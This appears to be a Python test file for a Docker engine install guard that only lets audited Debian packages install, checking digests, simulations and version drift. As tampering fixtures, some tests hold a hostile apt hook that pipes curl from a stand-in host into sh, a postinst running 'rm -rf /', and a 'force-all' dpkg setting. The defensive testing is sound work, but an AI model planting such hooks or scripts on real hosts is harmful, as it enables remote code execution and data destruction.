"""Tests for the Docker engine install guard's package step (child 3b).

Governing specification: `SPECIFICATION/non-functional-requirements.md`
section "Docker engine install guard", "Package fence". Governing design:
`docs/docker-engine-guard-design.md`, Mechanism 5 as amended by R6, F6 and
G7, plus implementation rider point 4.

Every assertion here runs against RECORDED command output. The step reaches
the world through one injectable runner, so `apt-get`, `apt-cache`, `dpkg`
and `dpkg-deb` are never executed: the fake runner answers the output
measured from a real host and records the `Command` each step emitted, and
the assertions are on THAT argv. One real subprocess runs in this file —
the one that proves the default runner is wired to `subprocess` at all.
"""

from __future__ import annotations

import hashlib
import importlib
import json
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

__all__: list[str] = []

_RUNNER_MODULE = "livespec_dev_tooling.fleet._docker_engine_guard_package_runner"
_RUNNER_PATH = Path("livespec_dev_tooling/fleet/_docker_engine_guard_package_runner.py")
_AUDIT_PATH = Path("livespec_dev_tooling/fleet/_docker_engine_guard_package_audit.py")
_PACKAGES_MODULE = "livespec_dev_tooling.fleet._docker_engine_guard_packages"

# The versions measured on the gmktec host on 2026-10-15, and the archive
# file names `apt-get download` writes for them.
_ENGINE = ("docker.io", "29.1.3-0ubuntu4.1")
_SHIM = ("containerd", "2.2.2-0ubuntu1.1")

# What stands in for the downloaded archives. The bytes themselves are
# arbitrary; what matters is that the recorded archive-index stanza and the
# committed maintainer-script digests are taken FROM them, so a test that
# alters either side is the test that proves the comparison happens.
_DEB_BYTES = b"deb bytes"
_POSTINST = {
    _ENGINE[0]: "#!/bin/sh\nset -e\n# docker.io postinst, as read at the audit\n",
    _SHIM[0]: "#!/bin/sh\nset -e\n# containerd postinst, as read at the audit\n",
}


# The host apt and dpkg configuration a committed digest vouches for. Both
# are measured shapes: the apt fragment is what `01autoremove` carries on a
# stock noble host, and `log` is dpkg's own default `dpkg.cfg` line.
_APT_HOOK = 'APT::Get::AutomaticRemove "true";\n'
_DPKG_CFG = "log /var/log/dpkg.log\n"


def _digest(*, data: bytes) -> str:
    """The SHA256 the fence compares, in the hex spelling the index uses."""
    return hashlib.sha256(data).hexdigest()


def _config_files(*, etc: Path) -> dict[Path, str]:
    """The host configuration files the fence digest-checks, and their content."""
    return {
        etc / "apt" / "apt.conf.d" / "01autoremove": _APT_HOOK,
        etc / "dpkg" / "dpkg.cfg": _DPKG_CFG,
    }


def _config_dirs(*, etc: Path) -> tuple[Path, ...]:
    """The directories whose every file a committed digest has to cover.

    `dpkg.cfg.d` is deliberately one of them while nothing creates it
    here: a host that carries no fragment directory at all must pass, so
    an absent directory is zero uncovered files rather than a refusal.
    """
    return (etc / "apt" / "apt.conf.d", etc / "dpkg" / "dpkg.cfg.d")


def _deb_name(*, package: str, version: str) -> str:
    """The archive file name `apt-get download` writes for one allowlist row."""
    return f"{package}_{version}_amd64.deb"


def _index_stanza(*, package: str, version: str, digest: str) -> str:
    """One `apt-cache show` stanza, in the shape the archive index carries it."""
    return (
        f"Package: {package}\n"
        f"Version: {version}\n"
        "Architecture: amd64\n"
        f"Filename: pool/universe/d/{package}/{_deb_name(package=package, version=version)}\n"
        "Size: 20418432\n"
        f"SHA256: {digest}\n"
    )


@dataclass(kw_only=True)
class _RecordedRunner:
    """The one injectable runner, answering RECORDED output and recording each call.

    `outputs` pairs an argv prefix with the output measured for it on a
    real host. A prefix carrying more than one output answers them in
    order and then repeats the last, which is how the SAME `dpkg-query`
    the fence runs on both sides of the install answers the host before
    the engine landed and then the host after it.
    """

    result: Any
    outputs: list[tuple[tuple[str, ...], list[str]]] = field(default_factory=list)
    calls: list[Any] = field(default_factory=list)

    def __call__(self, *, command: Any) -> Any:
        self.calls.append(command)
        for prefix, queued in self.outputs:
            if tuple(command.argv[: len(prefix)]) == prefix:
                return self.result(
                    returncode=0,
                    stdout=queued.pop(0) if len(queued) > 1 else queued[0],
                )
        return self.result(returncode=0, stdout="")


# `dpkg-query`'s recorded output in the format the fence asks for: the host
# before the engine lands, and the same host after it. The third line is
# measured output and not padding — `dpkg-query -W` lists a package dpkg
# merely KNOWS OF, from some dependency, with an EMPTY version field and
# the status `not-installed`. Admitted as a package at some version it
# would be a phantom in both the difference and the drift comparison.
_QUERY_BEFORE = """adduser 3.137ubuntu1 installed
libc6 2.39-0ubuntu8.4 installed
docker-compose-v2  not-installed
"""
_QUERY_AFTER = """adduser 3.137ubuntu1 installed
libc6 2.39-0ubuntu8.4 installed
docker-compose-v2  not-installed
containerd 2.2.2-0ubuntu1.1 installed
docker.io 29.1.3-0ubuntu4.1 installed
"""


# `apt-get -s install`'s recorded output for the audited set on a host that
# has never carried the engine: the two `Inst` lines carry a version in
# parentheses and NO bracketed version before it, which is what an install
# of a package not currently held looks like.
_SIMULATION_CLEAN = """NOTE: This is only a simulation!
      apt-get needs root privileges for real execution.
Reading package lists...
Building dependency tree...
The following NEW packages will be installed:
  containerd docker.io
0 upgraded, 2 newly installed, 0 to remove and 0 not upgraded.
Inst containerd (2.2.2-0ubuntu1.1 Ubuntu:24.04/noble-updates [amd64])
Inst docker.io (29.1.3-0ubuntu4.1 Ubuntu:24.04/noble-updates [amd64])
Conf containerd (2.2.2-0ubuntu1.1 Ubuntu:24.04/noble-updates [amd64])
Conf docker.io (29.1.3-0ubuntu4.1 Ubuntu:24.04/noble-updates [amd64])
"""


def _fenced_outputs() -> list[tuple[tuple[str, ...], list[str]]]:
    """The output a clean fenced transaction measures, command by command.

    Three of these are QUEUED per-package rather than answered once,
    because the fence asks each question once per allowlist row and the
    answers differ by row: the index stanza, the control version and the
    maintainer script. They are queued in the order the allowlist
    declares, which is the order the audit walks it in.
    """
    return [
        (("apt-get", "-s"), [_SIMULATION_CLEAN]),
        (
            ("apt-cache", "show"),
            [
                _index_stanza(package=package, version=version, digest=_digest(data=_DEB_BYTES))
                for package, version in (_ENGINE, _SHIM)
            ],
        ),
        (("dpkg-deb", "-f"), [f"{_ENGINE[1]}\n", f"{_SHIM[1]}\n"]),
        (("dpkg-deb", "-I"), [_POSTINST[_ENGINE[0]], _POSTINST[_SHIM[0]]]),
        (("dpkg-query",), [_QUERY_BEFORE, _QUERY_BEFORE, _QUERY_AFTER]),
    ]


def _payload(*, cache: Path) -> dict[str, Any]:
    """The committed package inputs a controller uploads for one run."""
    etc = cache.parent / "etc"
    return {
        "cache": str(cache),
        "config_digests": {
            path.as_posix(): _digest(data=text.encode("utf-8"))
            for path, text in _config_files(etc=etc).items()
        },
        "config_dirs": [directory.as_posix() for directory in _config_dirs(etc=etc)],
        "allow": [
            {
                "package": package,
                "version": version,
                "deb": _deb_name(package=package, version=version),
                "scripts": {"postinst": _digest(data=_POSTINST[package].encode("utf-8"))},
            }
            for package, version in (_ENGINE, _SHIM)
        ],
    }


def _declare(*, root: Path, payload: dict[str, Any]) -> Path:
    """Lay out one run's directory with `payload` as its package inputs.

    The downloaded archives are placed in the cache the payload names,
    because the step's own download goes through the fake runner and so
    writes nothing: the files standing in for its result are these.
    """
    cache = Path(str(payload["cache"]))
    cache.mkdir(parents=True, exist_ok=True)
    for package, version in (_ENGINE, _SHIM):
        (cache / _deb_name(package=package, version=version)).write_bytes(_DEB_BYTES)
    for path, text in _config_files(etc=cache.parent / "etc").items():
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text, encoding="utf-8")
    inputs = root / "runs" / "run-a" / "inputs"
    inputs.mkdir(parents=True, exist_ok=True)
    (inputs / "packages.json").write_text(json.dumps(payload), encoding="utf-8")
    return inputs


def _calls_named(*, runner: _RecordedRunner, argv: tuple[str, ...]) -> list[Any]:
    """Every recorded command whose argv begins with `argv`."""
    return [call for call in runner.calls if tuple(call.argv[: len(argv)]) == argv]


def test_the_package_step_installs_exactly_the_audited_debs_under_the_frontend_lock(
    tmp_path: Path,
) -> None:
    """Specification "Package fence": `dpkg -i` on exactly the audited files.

    Two halves, and both are the fence rather than a convenience. The argv
    is the audited `.deb` SET and nothing else, so the transaction that
    runs is byte-for-byte the one the audit cleared with no resolver
    decision left to apt. And `DPKG_FRONTEND_LOCKED=1` is what tells dpkg
    that its caller already holds the frontend lock (design R6) — without
    it dpkg takes the lock itself and the role's lock-holding helper, which
    has held it since the audit, deadlocks against its own install.
    """
    assert _RUNNER_PATH.is_file()
    assert _AUDIT_PATH.is_file()
    runner_module = importlib.import_module(_RUNNER_MODULE)
    packages = importlib.import_module(_PACKAGES_MODULE)
    inputs = _declare(root=tmp_path, payload=_payload(cache=tmp_path / "cache"))
    runner = _RecordedRunner(result=runner_module.CommandOutput, outputs=_fenced_outputs())

    outcome = packages.run_package_step(inputs=inputs, runner=runner)

    assert outcome.refusal is None
    installed = _calls_named(runner=runner, argv=("dpkg", "-i"))
    assert len(installed) == 1
    assert tuple(installed[0].argv) == (
        "dpkg",
        "-i",
        str(tmp_path / "cache" / _deb_name(package=_ENGINE[0], version=_ENGINE[1])),
        str(tmp_path / "cache" / _deb_name(package=_SHIM[0], version=_SHIM[1])),
    )
    assert installed[0].env == {"DPKG_FRONTEND_LOCKED": "1"}
    assert installed[0].timeout_seconds == runner_module.INSTALL_TIMEOUT_SECONDS


def test_the_package_step_refuses_a_simulated_transaction_the_allowlist_does_not_cover(
    tmp_path: Path,
) -> None:
    """Specification "Package fence": the three shapes a simulation may not have.

    The simulation is run with `--no-install-recommends --no-remove` and
    the exact pinned specs, so the only transaction apt is asked about is
    the committed one — and then the answer is read line by line anyway,
    because `--no-remove` makes a removal an apt ERROR rather than a
    silent `Remv`, and a resolver that satisfies the pins by UPGRADING
    something already installed has broken nothing apt would complain
    about. Each of the three refuses before anything is mutated.
    """
    assert _RUNNER_PATH.is_file()
    runner_module = importlib.import_module(_RUNNER_MODULE)
    packages = importlib.import_module(_PACKAGES_MODULE)
    inputs = _declare(root=tmp_path, payload=_payload(cache=tmp_path / "cache"))
    clean = _RecordedRunner(result=runner_module.CommandOutput, outputs=_fenced_outputs())

    assert packages.run_package_step(inputs=inputs, runner=clean).refusal is None
    simulated = _calls_named(runner=clean, argv=("apt-get", "-s"))
    assert len(simulated) == 1
    assert tuple(simulated[0].argv) == (
        "apt-get",
        "-s",
        "install",
        "--no-install-recommends",
        "--no-remove",
        "docker.io=29.1.3-0ubuntu4.1",
        "containerd=2.2.2-0ubuntu1.1",
    )

    for answer, expected in (
        (
            _SIMULATION_CLEAN + "Inst runc (1.4.0-0ubuntu1 Ubuntu:24.04/noble [amd64])\n",
            "runc=1.4.0-0ubuntu1",
        ),
        (_SIMULATION_CLEAN + "Remv containerd [1.7.27-0ubuntu1]\n", "removes containerd"),
        (
            _SIMULATION_CLEAN
            + "Inst libc6 [2.39-0ubuntu8.3] (2.39-0ubuntu8.4 Ubuntu:24.04/noble-updates)\n",
            "upgrades the installed libc6",
        ),
    ):
        runner = _RecordedRunner(
            result=runner_module.CommandOutput,
            outputs=[(("apt-get", "-s"), [answer]), (("dpkg-query",), [_QUERY_BEFORE])],
        )

        outcome = packages.run_package_step(inputs=inputs, runner=runner)

        assert outcome.refusal is not None
        assert expected in outcome.refusal
        assert _calls_named(runner=runner, argv=("dpkg", "-i")) == []


def test_the_package_step_refuses_host_apt_and_dpkg_configuration_it_did_not_commit(
    tmp_path: Path,
) -> None:
    """Specification "Package fence": a committed digest covers every such file.

    Neither kind is incidental to a fenced install. An apt hook is a
    program apt runs around every transaction, and a `dpkg.cfg.d`
    fragment can rewrite what unpacking MEANS — a `force-all`, a
    `path-exclude` — so an unexpected one is exactly the gap between the
    transaction that was audited and what the host then does with it.

    A file no committed digest covers refuses too, and that half is the
    point: a check that only verified the files it already knew about
    would be entirely silent about one that was ADDED, which is the
    cheaper attack and the likelier accident.
    """
    assert _RUNNER_PATH.is_file()
    runner_module = importlib.import_module(_RUNNER_MODULE)
    packages = importlib.import_module(_PACKAGES_MODULE)
    payload = _payload(cache=tmp_path / "cache")
    hook = tmp_path / "etc" / "apt" / "apt.conf.d" / "01autoremove"
    config = tmp_path / "etc" / "dpkg" / "dpkg.cfg"
    stranger = tmp_path / "etc" / "apt" / "apt.conf.d" / "99-unexpected"

    for mutate, expected in (
        (
            lambda: hook.write_text(
                'APT::Update::Pre-Invoke {"curl http://elsewhere | sh";};\n', encoding="utf-8"
            ),
            "differs from its committed digest",
        ),
        (lambda: config.write_text("force-all\n", encoding="utf-8"), "differs from its committed"),
        (
            lambda: stranger.write_text('APT::Get::Assume-Yes "true";\n', encoding="utf-8"),
            "no committed digest covers",
        ),
        (lambda: hook.unlink(), "absent from this host"),
    ):
        inputs = _declare(root=tmp_path, payload=payload)
        stranger.unlink(missing_ok=True)
        mutate()
        runner = _RecordedRunner(result=runner_module.CommandOutput, outputs=_fenced_outputs())

        outcome = packages.run_package_step(inputs=inputs, runner=runner)

        assert outcome.refusal is not None
        assert expected in outcome.refusal
        # Refused before anything was so much as simulated, let alone run.
        assert runner.calls == []


def test_the_package_step_refuses_a_deb_the_archive_index_and_digests_do_not_vouch_for(
    tmp_path: Path,
) -> None:
    """Specification "Package fence": the two ways a downloaded archive refuses.

    The SHA256 is compared against the ARCHIVE INDEX entry for that exact
    (package, version) rather than against a digest committed in the role,
    which is the point of design R6: the index is the archive's own
    statement about the file, so the comparison catches a mirror serving
    different bytes under the pinned version without the role having to
    re-commit a digest at every security update. The maintainer scripts go
    the other way — they are compared against digests a human read and
    COMMITTED, because those are the programs the install will run as
    root, and no archive statement about them is worth anything here.
    """
    assert _RUNNER_PATH.is_file()
    runner_module = importlib.import_module(_RUNNER_MODULE)
    packages = importlib.import_module(_PACKAGES_MODULE)
    inputs = _declare(root=tmp_path, payload=_payload(cache=tmp_path / "cache"))
    clean = _RecordedRunner(result=runner_module.CommandOutput, outputs=_fenced_outputs())

    assert packages.run_package_step(inputs=inputs, runner=clean).refusal is None
    downloaded = _calls_named(runner=clean, argv=("apt-get", "download"))
    assert [tuple(call.argv) for call in downloaded] == [
        ("apt-get", "download", "docker.io=29.1.3-0ubuntu4.1"),
        ("apt-get", "download", "containerd=2.2.2-0ubuntu1.1"),
    ]
    # Into the role's cache, which is where the audited set is read from —
    # `apt-get download` writes to its working directory and nowhere else.
    assert {call.cwd for call in downloaded} == {tmp_path / "cache"}

    other_bytes = _digest(data=b"bytes some mirror served instead")
    for outputs, expected in (
        (
            [
                (
                    ("apt-cache", "show"),
                    [
                        _index_stanza(package=_ENGINE[0], version=_ENGINE[1], digest=other_bytes),
                    ],
                )
            ],
            "differs from the archive index",
        ),
        (
            [(("dpkg-deb", "-I"), ["#!/bin/sh\nrm -rf /\n"])],
            "postinst differs from its committed digest",
        ),
    ):
        runner = _RecordedRunner(
            result=runner_module.CommandOutput, outputs=[*outputs, *_fenced_outputs()]
        )

        outcome = packages.run_package_step(inputs=inputs, runner=runner)

        assert outcome.refusal is not None
        assert expected in outcome.refusal
        assert _calls_named(runner=runner, argv=("dpkg", "-i")) == []


def test_the_package_step_refuses_a_download_the_archive_cannot_account_for(
    tmp_path: Path,
) -> None:
    """The three ways the download itself fails to produce an auditable archive.

    None of them is exotic and none of them raises: `apt-get download`
    exits 0 having written nothing when the pinned version has fallen out
    of the index; `apt-cache show` prints a stanza with no `SHA256:` when
    the index entry came from a source that carries none; and a `.deb`
    whose control version is not the pinned one is a cache collision on
    the file NAME. Each must stop the step rather than reach `dpkg -i`.
    """
    assert _RUNNER_PATH.is_file()
    runner_module = importlib.import_module(_RUNNER_MODULE)
    packages = importlib.import_module(_PACKAGES_MODULE)
    payload = _payload(cache=tmp_path / "cache")
    inputs = _declare(root=tmp_path, payload=payload)
    indexless = "Package: docker.io\nVersion: 29.1.3-0ubuntu4.1\nArchitecture: amd64\n"

    for outputs, drop, expected in (
        ([], True, "left no docker.io_29.1.3-0ubuntu4.1_amd64.deb"),
        ([(("apt-cache", "show"), [indexless])], False, "carries no SHA256"),
        ([(("dpkg-deb", "-f"), ["29.1.2-0ubuntu4\n"])], False, "control version"),
    ):
        if drop:
            (tmp_path / "cache" / _deb_name(package=_ENGINE[0], version=_ENGINE[1])).unlink()
        runner = _RecordedRunner(
            result=runner_module.CommandOutput, outputs=[*outputs, *_fenced_outputs()]
        )

        outcome = packages.run_package_step(inputs=inputs, runner=runner)

        assert outcome.refusal is not None
        assert expected in outcome.refusal
        assert _calls_named(runner=runner, argv=("dpkg", "-i")) == []
        inputs = _declare(root=tmp_path, payload=payload)


def test_the_package_step_refuses_when_an_installed_version_moved_under_the_audit(
    tmp_path: Path,
) -> None:
    """Specification "Package fence": a version the audit relied on may not move.

    The audit is not instantaneous — it simulates a transaction, then
    downloads and digests every archive — and its verdict rests on the
    versions the host held while it ran, because that is what apt
    resolved the pins against. So dpkg's table is read again immediately
    before the mutation and compared: an unattended upgrade that landed
    libc6 in between did not break any committed digest, and would leave
    the audited verdict resting on a host that no longer exists.
    """
    assert _RUNNER_PATH.is_file()
    runner_module = importlib.import_module(_RUNNER_MODULE)
    packages = importlib.import_module(_PACKAGES_MODULE)
    inputs = _declare(root=tmp_path, payload=_payload(cache=tmp_path / "cache"))
    moved = _QUERY_BEFORE.replace("libc6 2.39-0ubuntu8.4", "libc6 2.39-0ubuntu8.5")
    runner = _RecordedRunner(
        result=runner_module.CommandOutput,
        outputs=[(("dpkg-query",), [_QUERY_BEFORE, moved]), *_fenced_outputs()],
    )

    outcome = packages.run_package_step(inputs=inputs, runner=runner)

    assert outcome.refusal is not None
    assert "libc6" in outcome.refusal
    assert _calls_named(runner=runner, argv=("dpkg", "-i")) == []


def test_the_package_step_requires_the_post_install_difference_to_be_the_additions(
    tmp_path: Path,
) -> None:
    """Specification "Package fence": the difference MUST be the audited additions.

    The audit cleared one transaction; the `dpkg-query` difference across
    the install is the only evidence that the transaction which actually
    ran was that one. A dpkg run that landed a package nobody audited — a
    dependency unpacked from a stale archive in the cache, a resolver
    decision the simulation did not predict — leaves the host carrying it
    and raises no other signal whatever, so the difference is compared
    against the additions rather than merely inspected for the ones
    expected.
    """
    assert _RUNNER_PATH.is_file()
    runner_module = importlib.import_module(_RUNNER_MODULE)
    packages = importlib.import_module(_PACKAGES_MODULE)
    inputs = _declare(root=tmp_path, payload=_payload(cache=tmp_path / "cache"))
    unaudited = _QUERY_AFTER + "runc 1.4.0-0ubuntu1 installed\n"
    runner = _RecordedRunner(
        result=runner_module.CommandOutput,
        outputs=[(("dpkg-query",), [_QUERY_BEFORE, _QUERY_BEFORE, unaudited]), *_fenced_outputs()],
    )

    outcome = packages.run_package_step(inputs=inputs, runner=runner)

    assert outcome.refusal is not None
    assert "runc=1.4.0-0ubuntu1" in outcome.refusal
    assert outcome.installed == ()


def test_the_package_step_refuses_when_the_runs_committed_inputs_are_unreadable(
    tmp_path: Path,
) -> None:
    """A run whose package inputs cannot be read installs nothing at all.

    The refusal is RETURNED rather than raised, which is the Result
    discipline this repository requires carried in the stdlib-only shape
    the guard modules use — they are copied onto the guarded host and run
    against its bare interpreter, where `returns` is not importable.
    """
    assert _RUNNER_PATH.is_file()
    runner_module = importlib.import_module(_RUNNER_MODULE)
    packages = importlib.import_module(_PACKAGES_MODULE)
    inputs = tmp_path / "runs" / "run-a" / "inputs"
    inputs.mkdir(parents=True)
    runner = _RecordedRunner(result=runner_module.CommandOutput)

    outcome = packages.run_package_step(inputs=inputs, runner=runner)

    assert outcome.refusal is not None
    assert "packages.json" in outcome.refusal
    assert runner.calls == []


def test_the_package_step_refuses_committed_inputs_that_declare_no_allowlist(
    tmp_path: Path,
) -> None:
    """Inputs that parse but carry no allowlist are a refusal, not an empty install.

    An absent allowlist read as "install nothing" would make a malformed
    upload indistinguishable from a successful transaction — the step would
    report a clean install having audited nothing.
    """
    assert _RUNNER_PATH.is_file()
    runner_module = importlib.import_module(_RUNNER_MODULE)
    packages = importlib.import_module(_PACKAGES_MODULE)
    payload = _payload(cache=tmp_path / "cache")
    del payload["allow"]
    inputs = _declare(root=tmp_path, payload=payload)
    runner = _RecordedRunner(result=runner_module.CommandOutput)

    outcome = packages.run_package_step(inputs=inputs, runner=runner)

    assert outcome.refusal is not None
    assert "allowlist" in outcome.refusal
    assert runner.calls == []


def test_the_default_runner_spawns_the_argv_and_answers_its_output() -> None:
    """The real runner is the one place the guard's package step spawns anything.

    Asserted against a harmless `/bin/echo` rather than against a mock,
    because the thing worth proving is that the seam is wired to
    `subprocess` with the timeout it was given — every other test in this
    file deliberately proves the opposite, that nothing else spawns.
    """
    assert _RUNNER_PATH.is_file()
    runner_module = importlib.import_module(_RUNNER_MODULE)

    answer = runner_module.default_runner(
        command=runner_module.TimedCommand(
            argv=("/bin/echo", "recorded"),
            timeout_seconds=runner_module.COMMAND_TIMEOUT_SECONDS,
        )
    )

    assert answer.returncode == 0
    assert answer.stdout == "recorded\n"


def test_the_default_runner_adds_its_environment_rather_than_replacing_it() -> None:
    """`env` carries ADDITIONS, so the one variable the fence sets rides along.

    `dpkg -i` needs `DPKG_FRONTEND_LOCKED=1` AND the dpkg environment the
    guard did not build (PATH above all). A runner that passed `env`
    straight through to `subprocess` would hand dpkg an environment of
    exactly one variable.
    """
    assert _RUNNER_PATH.is_file()
    runner_module = importlib.import_module(_RUNNER_MODULE)

    answer = runner_module.default_runner(
        command=runner_module.TimedCommand(
            argv=("/usr/bin/env",),
            timeout_seconds=runner_module.COMMAND_TIMEOUT_SECONDS,
            env={"DPKG_FRONTEND_LOCKED": "1"},
        )
    )

    assert "DPKG_FRONTEND_LOCKED=1" in answer.stdout.splitlines()
    assert any(line.startswith("PATH=") for line in answer.stdout.splitlines())
